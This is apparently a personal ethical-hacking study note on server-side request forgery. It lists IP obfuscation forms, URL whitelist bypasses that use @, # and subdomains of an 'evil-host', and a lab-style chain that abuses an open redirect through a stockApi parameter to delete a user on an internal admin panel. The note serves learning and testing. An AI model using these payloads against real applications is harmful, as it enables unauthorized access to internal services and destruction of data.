# Obfuscation
There are different ways to obfuscate
- Web: [IP](https://vinx.tuxfamily.org/ioc.html)
- 127.0.0.1, such as 2130706433, 017700000001, or 127.1
- Repository: [Own](https://github.com/SebasR1C0/Ethical-Hacking/blob/main/Web%20Hacking/Obfuscating%20attacks.md)

# Whitelist-based
You can embed credentials in a URL before the hostname, using the @ character. 
```
https://expected-host:fakepassword@evil-host
```
Use to redirect to expected-host
You can use the # character to indicate a URL fragment.
```
https://evil-host#expected-host
```
Note: Before # is commented
You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. 
```
https://expected-host.evil-host
```
# Redirection
1. Find the api vulnerable
```
POST /product/stock
```
2. Find the redirection
```
GET /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin 
```
3. Change the parameter in the api vuln
```
stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete?username=carlos
```
